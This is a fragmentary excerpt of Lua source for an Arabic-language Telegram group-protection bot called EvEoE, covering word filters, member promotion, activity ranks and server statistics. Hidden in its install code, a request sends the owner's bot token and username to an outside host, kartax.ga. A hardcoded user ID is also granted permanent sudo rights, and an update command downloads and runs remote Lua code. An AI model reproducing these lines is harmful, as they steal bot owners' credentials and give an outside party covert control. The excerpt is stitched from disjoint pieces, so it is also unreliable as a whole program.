...
https.request('http://kartax.ga/EvEoE/?token='..token..'&id='..SUDO..'&install='..install..'&UserName='..database:get(id_server..":SUDO:USERNAME"))
print('\n\27[1;34m doneeeeeeee senddddddddddddd :')
file = io.open("EvEoE", "w")  
file:write([[
#!/usr/bin/env bash
cd $HOME/EvEoE
token="]]..database:get(id_server..":token")..[["
...
sudo_users = {SUDO,576267439,576267439}   
...
if tonumber(user_id) == tonumber(576267439) then  
var = true  
elseif tonumber(user_id) == tonumber(576267439) then
var = true  
...
local EvEoE_Msg = ''  
if msgs < 100 then 
EvEoE_Msg = 'غير متفاعل ' 
elseif msgs < 200 then 
EvEoE_Msg = 'بده يتحسن ' 
elseif msgs < 400 then 
EvEoE_Msg = 'شبه متفاعل ' 
elseif msgs < 700 then 
EvEoE_Msg = 'متفاعل ' 
elseif msgs < 1200 then 
EvEoE_Msg = 'متفاعل قوي ' 
elseif msgs < 2000 then 
EvEoE_Msg = 'متفاعل جدا ' 
elseif msgs < 3500 then 
EvEoE_Msg = 'اقوى تفاعل '  
elseif msgs < 4000 then 
EvEoE_Msg = 'متفاعل نار ' 
elseif msgs < 4500 then 
EvEoE_Msg = 'قمة التفاعل ' 
elseif msgs < 5500 then 
EvEoE_Msg = 'اسد التفاعل ' 
elseif msgs < 7000 then 
EvEoE_Msg = 'ملك التفاعل' 
elseif msgs < 9500 then 
EvEoE_Msg = 'احلا تفاعل ' 
elseif msgs < 10000000000 then 
EvEoE_Msg = 'رب التفاعل '  
end 
return EvEoE_Msg 
end
...
function plugin_EvEoEa(msg)
for v in io.popen('ls File_Bot'):lines() do
if v:match(".lua$") then
plugin = dofile("File_Bot/"..v)
if plugin.EvEoEa and msg then
pre_msg = plugin.EvEoEa(msg)
end
end
end
...
--------------------------------------------------------------------------------------------------------------
function SourceEvEoE(msg,data) -- بداية العمل
if msg then
...
SourceEvEoEr = '📥┇مرحبا بك عزيزي 👋🏼،\n🔰┇انا بوت حمايه المجموعات  ؟\n📮┇يمكنك اضافتي الى مجموعتك •\n🖇┇آضفني وارفعني مشرف ارسل < تفعيل >\n[📡┇قناة سورس البوت](t.me/EvEoE)'
end 
send(msg.chat_id_, msg.id_, SourceEvEoEr) 
end
end
...
send(msg.chat_id_, msg.id_,EvEoE_Msg) 
return false  
end 
if text then    
...
if text == 'السيرفر🔎' and SudoBot(msg) then 
 local text2 = 'Info Server : \n'
  local EvEoE1 = database:info()
  text2 = text2..'1 - *Uptime Days* : `'..EvEoE1.server.uptime_in_days..'('..EvEoE1.server.uptime_in_seconds..' seconds)`\n'
  text2 = text2..'2 - *Commands Processed* : `'..EvEoE1.stats.total_commands_processed..'`\n'
  text2 = text2..'3 - *Expired Keys* : `'..EvEoE1.stats.expired_keys..'`\n'
  text2 = text2..'4 - *Ops/sec* : `'..EvEoE1.stats.instantaneous_ops_per_sec..'`\n'
...
os.execute('wget https://raw.githubusercontent.com/SORESEVEO/EvEoE/master/EvEoE.lua')
send(msg.chat_id_, msg.id_,'🗂️┇ تم تحديث السورس')
dofile('EvEoE.lua')  
end
if text == 'الاصدار⚙️' and SudoBot(msg) then 
database:del(bot_id..'Srt:Bot') 
send(msg.chat_id_, msg.id_,'📡┇ اصدار سورس ايفو \n📟┇ الاصدار ←{ 1.2v}') 
end
...
send(msg.chat_id_, msg.id_,'📌┇ عدد المجموعات الان » { '..#group..' }'..EvEoEk..''..EvEoE..'\n*📌┇ الان عدد المجموعات الحقيقي » { '..sendok..' } مجموعات\n')   
end
end
end,nil)
end
...
usertext = '\n👤┇ العضو » ['..result.title_..'](t.me/'..(username or 'EvEoE')..')'
...
usertext = '\n👤┇ العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'EvEoE')..')'
status  = '\n☑️┇ تم ترقيته مطور في البوت'
...
local EvEoE1_Msg = database:get(bot_id.."EvEoE1:Add:Filter:Rp2"..text..msg.chat_id_)   
if EvEoE1_Msg then 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'👤┇ العضو ← ['..utf8.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'EvEoE')..') \n 📬┇'..EvEoE1_Msg)
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
end,nil)
end
...
--------------------------------------------------------------------------------------------------------------
if EvEoE_Msg and not Special(msg) then  
local EvEoE_Msg = database:get(bot_id.."Add:Filter:Rp2"..text..msg.chat_id_)   
if EvEoE_Msg then    
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0,"⚠┇العضو : {["..data.first_name_.."](T.ME/"..data.username_..")}\n🚫┇["..EvEoE_Msg.."] \n") 
else
send(msg.chat_id_,0,"⚠┇العضو : {["..data.first_name_.."](T.ME/EvEoE)}\n🚫┇["..EvEoE_Msg.."] \n") 
end
end,nil)   
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
...
send(msg.chat_id_,0, "⚠┇عذرا يا » {["..data.first_name_.."](T.ME/EvEoE)}\n📮┇ الملصق الذي ارسلته تم منعه من المجموعه \n" ) 
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
...
🏆┇EvEoE TeAm 
━ ━ ━ ━ ━ ━ ━ ━ ━ 
💥┇[Channel EvEoE](t.me/EvEoE)
🥇┇[Information](t.me/BoTaTII)
👨🏻‍💻┇[Devlpoer](t.me/moqtad_a)
🎈┇[Group EvEoE](https://t.me/EoEvE)
━ ━ ━ ━ ━ ━ ━ ━ ━ 
📨┇[TwAsl Source](t.me/Mooabot)
]]
send(msg.chat_id_, msg.id_,Text)
return false
end
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data)  
send(msg.chat_id_, msg.id_,'👤┇ بواسطه ← ['..utf8.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'EvEoE')..') \n☑️┇ تـم قفـل الدردشه\n⛔┇ الحاله ← المسح ')  
end,nil)   
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'👤┇ بواسطه ← ['..string.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'EvEoE')..') \n☑️┇ تـم قفـل التاك بالكتم\n⛔┇ الحاله ←الكتم ')  
end,nil)   
...
database:set(bot_id.."EvEoE1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"rep")  
return false  
end    
if text then   
local tsssst = database:get(bot_id.."EvEoE1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if tsssst == "rep" then   
send(msg.chat_id_, msg.id_,"☑️┇ارسل التحذير عند ارسال الكلمه")  
database:set(bot_id.."EvEoE1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"repp")  
database:set(bot_id.."EvEoE1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_, text)  
database:sadd(bot_id.."EvEoE1:List:Filter"..msg.chat_id_,text)  
return false  end  
end
if text then  
local test = database:get(bot_id.."EvEoE1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if test == "repp" then  
send(msg.chat_id_, msg.id_,"🔖┇تم منع الكلمه مع التحذير")  
database:del(bot_id.."EvEoE1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
local test = database:get(bot_id.."EvEoE1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_)  
if text then   
database:set(bot_id.."EvEoE1:Add:Filter:Rp2"..test..msg.chat_id_, text)  
end  
database:del(bot_id.."EvEoE1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_)  
return false  end  
end

if text == "الغاء منع" and msg.reply_to_message_id_ == 0 and Manager(msg) then    
send(msg.chat_id_, msg.id_,"🔖┇ارسل الكلمه الان")  
database:set(bot_id.."EvEoE1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"reppp")  
return false  end
if text then 
local test = database:get(bot_id.."EvEoE1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
...
database:del(bot_id.."EvEoE1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
database:del(bot_id.."EvEoE1:Add:Filter:Rp2"..text..msg.chat_id_)  
database:srem(bot_id.."EvEoE1:List:Filter"..msg.chat_id_,text)  
return false  end  
end
...
local list = database:smembers(bot_id.."EvEoE1:List:Filter"..msg.chat_id_)  
for k,v in pairs(list) do  
database:del(bot_id.."EvEoE1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
database:del(bot_id.."EvEoE1:Add:Filter:Rp2"..v..msg.chat_id_)  
database:srem(bot_id.."EvEoE1:List:Filter"..msg.chat_id_,v)  
end  
...
t = "\n⛔┇قائمة المنع \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ \n"
for k,v in pairs(list) do  
local EvEoE_Msg = database:get(bot_id.."EvEoE1:Add:Filter:Rp2"..v..msg.chat_id_)   
t = t..""..k.."- "..v.." » {"..EvEoE_Msg.."}\n"    
end  
if #list == 0 then  
...
if blakrt == 'مميز' and Mod(msg) then
send(msg.chat_id_, msg.id_,'\n👤┇ العضو » ['..result.title_..'](t.me/'..(text1[3] or 'EvEoE')..')'..'\n☑️┇ تم رفعه '..text1[2]..' هنا')   
database:sadd(bot_id..'Special:User'..msg.chat_id_,result.id_)  
...
if text == ""..(database:get(bot_id..'Name:Bot') or 'ايفو').."" then  
Namebot = (database:get(bot_id..'Name:Bot') or 'ايفو')
local EvEoE_Msg = {
'دا اشرب جاي مفارغلك',
'لابسك لتلح',
'نايم حبي نايم',
...
send(msg.chat_id_, msg.id_,'['..EvEoE_Msg[math.random(#EvEoE_Msg)]..']') 
return false
end
...
-------------------------------
if text == ""..(database:get(bot_id..'Name:Bot') or 'ايفو').." غادر" or text == 'غادر' then  
...
-- vardump(data) 
EvEoEdx(msg.chat_id_, msg.id_, '📤┇ ايدي المجموعة » ( '..msg.chat_id_..' )\n☑️┇ عدد الادمنيه » ( *'..data.administrator_count_..' )*\n📛┇ عدد المحظورين » ( *'..data.kicked_count_..' )*\n🏆┇ عدد الاعضاء » ( *'..data.member_count_..' )*\n', 'md') 
end 
...
local Name_Bot = (database:get(bot_id..'Name:Bot') or 'ايفو')
...
EvEoE = https.request("https://api.telegram.org/bot"..token.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..mem_id[i].id_)
local Json_Info = JSON.decode(EvEoE)
...
--------------------------------------------------------------------------------------------------------------
SourceEvEoE(data.message_,data)
plugin_EvEoEa(data.message_)
--------------------------------------------------------------------------------------------------------------
if Chat_Type == 'GroupBot' and ChekAdd(msg.chat_id_) == true then
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
...
------------------------------------------------------------------------
local EvEoEAbot = database:get(bot_id.."EvEoE1:Add:Filter:Rp2"..text..result.chat_id_)   
if EvEoEAbot then    
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0,"⚠┇العضو : {["..data.first_name_.."](T.ME/"..data.username_..")}\n🚫┇["..EvEoEAbot.."] \n") 
...
------------------------------------------------------------------------
if text then
local EvEoE1_Msg = database:get(bot_id.."EvEoE1:Add:Filter:Rp2"..text..result.chat_id_)   
if EvEoE1_Msg then    
send(msg.chat_id_, msg.id_,"🔖┇"..EvEoE1_Msg)
